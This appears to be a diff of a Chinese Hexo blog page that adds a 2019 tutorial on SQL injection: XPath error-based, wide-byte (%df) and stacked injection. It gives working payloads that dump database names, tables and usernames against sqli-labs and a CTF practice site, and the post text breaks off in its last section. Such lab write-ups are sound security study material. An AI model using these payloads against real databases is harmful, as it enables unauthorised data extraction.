@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Lemon&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name"></a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">Lemon's blog</a>
 </header>
@@ -220,24 +231,68 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/744896.png)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            [Untitled Post]
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.9k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/28</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,42 +393,124 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/10/24/任意文件下载漏洞/">
-            
-                <span>任意文件下载漏洞简析</span>
-        </a>
-        <div class="abstract-content">
-            前言：之前没有接触过这个知识，恰好这次有一道题考了这方面的知识，就来详细的学习一下任意文件下载漏洞
-任意下载漏洞简介由于业务需求，很多网站往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可以利用这种方式下载服务器的敏感文件，对服务器进行进一步的威胁和攻击。
-任意下载漏洞的危害通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等。
-通过上面的简单介绍，可以看出任意下载漏洞是很常见的，如果对用户查看或下载的文件不做限制，就又可能被利...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="任意文件下载">任意文件下载</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>SQL注入是web安全中最常见的攻击方式，SQL注入有很多姿势，但如果只知道payload，不知道原理，感觉也很难掌握，这次就总结一下我所遇到的SQL注入姿势，原理分析+题目实战。</p>
+<h1 id="0x00-Xpath报错注入"><a href="#0x00-Xpath报错注入" class="headerlink" title="0x00 Xpath报错注入"></a><strong>0x00 Xpath报错</strong>注入</h1><h3 id="涉及函数"><a href="#涉及函数" class="headerlink" title="涉及函数"></a><strong>涉及函数</strong></h3><p>updatexml():对xml进行查询和修改 </p>
+<p>extractvalue():对xml进行查询和修改 </p>
+<h3 id="报错语句构造"><a href="#报错语句构造" class="headerlink" title="报错语句构造"></a><strong>报错语句构造</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))；</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,user(),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,version(),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '~5.5.53~'</span><br></pre></td></tr></table></figure>
+<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a><strong>原理分析</strong></h3><p>extractvalue(xml_str , Xpath) 函数,按照Xpath语法从XML格式的字符串中提取一个值，如果函数中任意一个参数为NULL,返回值都是NULL。</p>
+<p>其实就是对XML文档进行查询的函数，相当于HTML文件中用 <div><p><a>等标签查找元素一样，第一个参数传入目标xml文档，第二个参数使用Xpath路径法表示的查找路径</a></p>
+<p>举个简单例子：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">'&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;'</span>,<span class="string">'/a/c'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>寻找前一段xml文档内容中的a节点下的c节点 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+<span class="comment">----------------------------------------------------------+</span></span><br><span class="line">| extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;','/a/c') |</span><br><span class="line">+<span class="comment">----------------------------------------------------------+</span></span><br><span class="line">| accc                                                     |</span><br><span class="line">+<span class="comment">----------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
+<p>正常情况下的使用便是这样，但如果我们构造了不合法的Xpath ，MySQL便会出现语法错误，从而显示出XPath的内容。</p>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572073796052.png" alt="1572073796052"></p>
+<p>发现报错时少了一部分，没有前面的root，产生这样的问题是<strong>因为Xpath语法只有遇到特殊字符时才会报错</strong></p>
+<p>那我们直接在需要连接的字符前添加特殊字符即可爆出我们想要的结果</p>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572074235924.png" alt="1572074235924"></p>
+<p>但是也要注意，报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断</p>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572074511421.png" alt="1572074511421"></p>
+<p>updatexml()函数 与extractvalue()类似 ，是更新xml文档的函数 </p>
+<p>updatexml()函数有三个参数，分别是(XML_document, XPath_string, new_value) </p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称 </p>
+<p>第二个参数：XPath_string (Xpath格式的字符串) </p>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据  </p>
+<p>原理相同，都是遇到特殊字符爆出错误</p>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572075380985.png" alt="1572075380985"></p>
+<h3 id="题目实战"><a href="#题目实战" class="headerlink" title="题目实战"></a>题目实战</h3><p>sqli-labs17关，涉及到xpath报错注入 </p>
+<p>uname尝试发现没有任何变化，尝试下passwd，发现单引号报错，且有报错信息，可以使用xpath报错注入 尝试下爆出数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; or updatexml(1,concat(0x7e,database(),0x7e),1)# &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572075661966.png" alt="1572075661966"></p>
+<p>既然xpath报错注入可以,那就来一一爆出表、字段、值即可</p>
+<p><strong>payload：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; or updatexml(1,(select group_concat(table_name) from </span><br><span class="line">information_schema.TABLES where TABLE_SCHEMA=database()),1)# &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572075901692.png" alt="1572075901692"></p>
+<p>下面就基本上将payload改下即可，但到爆值时会出一个问题</p>
+<p><strong>payload</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos; or updatexml(1,concat(0x7e,(select username from users),0x7e),1)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572077205888.png" alt="1572077205888"></p>
+<p>出现这个错误的，是因为不能先select出同一表中的某些值，再update这个表</p>
+<p>百度查找解决方法，发现需要再在外面加一层select即可解决</p>
+<p><strong>最终payload</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos; or updatexml(1,concat(0x7e,(select username from (select username </span><br><span class="line">from users)c limit 0,1),0x7e),1)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572077324180.png" alt="1572077324180"></p>
+<h1 id="0x01-宽字节注入"><a href="#0x01-宽字节注入" class="headerlink" title="0x01 宽字节注入"></a>0x01 宽字节注入</h1><h3 id="涉及函数-1"><a href="#涉及函数-1" class="headerlink" title="涉及函数"></a><strong>涉及函数</strong></h3><p>addslashes()函数返回在预定义字符之前添加反斜杠的字符串 </p>
+<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符 </p>
+<p>mysql_escape_string() —  转义一个字符串 </p>
+<h3 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h3><p>先了解一下什么是窄、宽字节已经常见宽字节编码：</p>
+<p>一、当某字符的大小为一个字节时，称其字符为窄字节.</p>
+<p>二、当某字符的大小为两个字节时，称其字符为宽字节.</p>
+<p>三、所有英文默认占一个字节，汉字占两个字节</p>
+<p>四、常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等</p>
+<p>为什么会产生宽字节注入，其中就涉及到编码格式的问题了，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p>
+<p>问题就出现在使用PHP连接MySQL的时候，当设置</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“<span class="built_in">set</span> character_set_client = gbk”</span><br></pre></td></tr></table></figure>
+<p>时会导致一个编码转换的问题 </p>
+<p>如果数据库使用的的是GBK编码而PHP编码为UTF8就可能出现注入问题，原因是程序员为了防止SQL注入，就会调用我们上面所介绍的几种函数，将单引号或双引号进行转义操作，转义无非便是在单或双引号前加上斜杠（\）进行转义 ，但这样并非安全，因为数据库使用的是宽字节编码，两个连在一起的字符会被当做是一个汉字，而在PHP使用的UTF8编码则认为是两个独立的字符，如果我们在单或双引号前添加一个字符，使其和斜杠（\）组合被当作一个汉字，从而保留单或双引号，使其发挥应用的作用。但添加的字符的Ascii要大于128，两个字符才能组合成汉字 ，因为前一个ascii码要大于128，才到汉字的范围 ，这一点需要注意。</p>
+<h3 id="题目实战-1"><a href="#题目实战-1" class="headerlink" title="题目实战"></a>题目实战</h3><p>大段的文字可能枯燥无味，下面实战来体验一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>返回结果为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your sql:select id,title from news where id = &apos;1\&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>发现被转义了，使用最经典的%df </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&apos; and 1=1%23</span><br></pre></td></tr></table></figure>
+<p>返回结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your sql:select id,title from news where  id =&apos;1運&apos; and 1=1#&apos;</span><br></pre></td></tr></table></figure>
+<p>％df和后面的\变成了一个汉字“运” ,所以单引号就可以不被转义，从而发挥闭合作用</p>
+<p>爆出数据库，下面就很简单了，相当于知道了闭合符号，常用的payload更改一下即可</p>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572179547037.png" alt="1572179547037"></p>
+<p>SQL-labs32和33关也涉及到了宽字节注入，输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-32/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572180923901.png" alt="1572180923901"></p>
+<p>发现也是被转义了，那可以试一下宽字节注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-32/?id=1%df%27</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\AppData\Local\Temp\1572180984747.png" alt="1572180984747"></p>
+<p>出现报错语句，说明单引号已经起作用了，后面的就常规payload即可</p>
+<h1 id="0x02-堆叠注入"><a href="#0x02-堆叠注入" class="headerlink" title="0x02 堆叠注入"></a>0x02 堆叠注入</h1><h3 id="涉及字符"><a href="#涉及字符" class="headerlink" title="涉及字符"></a><strong>涉及字符</strong></h3><p>分号（;），在SQL语句中用来表示一条sql语句的结束 </p>
+<h3 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h3><p>堆叠注入可以执行任意的语句 ，多条sql 语句一起执行。在MYSQL命令框中，常以<code>;</code>作为结束符，那我们便可以在一句SQL语句结束后再紧跟一句SQL语句 。</p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;use web1;select 1,2,3;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BWVS               |</span><br><span class="line">| bbs                |</span><br><span class="line">| challenges         |</span><br><span class="line">| dvwa               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| test               |</span><br><span class="line">| web1               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">10 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">+<span class="comment">---+---+---+</span></span><br><span class="line">| <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> |</span><br><span class="line">+<span class="comment">---+---+---+</span></span><br><span class="line">| <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> |</span><br><span class="line">+<span class="comment">---+---+---+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>但堆叠注入是有局限性的，并不是每个环境都可以用到的:</p>
+<p>一、可能受到API或者数据库引擎不支持的限制 </p>
+<p>二、权限不足 </p>
+<p>所以一般这种方法的注入只会出现在CTF题中，但正因为这种方法感觉简单，很多人都会忽略掉，强网杯的web题随便注便用到了这种方法，当时真的懵的一批。</p>
+<h3 id="题目实战-2"><a href="#题目实战-2" class="headerlink" title="题目实战"></a>题目实战</h3><p><img src="/2019/10/28/原理+实战掌握SQL注入各种姿势/Users\赵志豪\Pictures\先知1\1.png" alt></p>
+<p>发现是回显注入，在测试过程中，发现 </p>
+</div></p>
     </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/10/27/通过sql-labs进行sql注入学习(11-22)/" title="通过sql-labs进行sql注入学习(11-22)">
+                    <div class="prevTitle">通过sql-labs进行sql注入学习(11-22)</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -464,6 +601,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-Xpath报错注入"><span class="toc-number">2.</span> <span class="toc-text">0x00 Xpath报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及函数"><span class="toc-number">2.0.1.</span> <span class="toc-text">涉及函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错语句构造"><span class="toc-number">2.0.2.</span> <span class="toc-text">报错语句构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理分析"><span class="toc-number">2.0.3.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目实战"><span class="toc-number">2.0.4.</span> <span class="toc-text">题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-宽字节注入"><span class="toc-number">3.</span> <span class="toc-text">0x01 宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及函数-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">涉及函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理分析-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目实战-1"><span class="toc-number">3.0.3.</span> <span class="toc-text">题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-堆叠注入"><span class="toc-number">4.</span> <span class="toc-text">0x02 堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及字符"><span class="toc-number">4.0.1.</span> <span class="toc-text">涉及字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理分析-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目实战-2"><span class="toc-number">4.0.3.</span> <span class="toc-text">题目实战</span></a></li></ol></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1731,6 +1886,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
 	<!-- 雪花特效 -->
 	<script type="text/javascript" src="\lib\snow.js"></script>
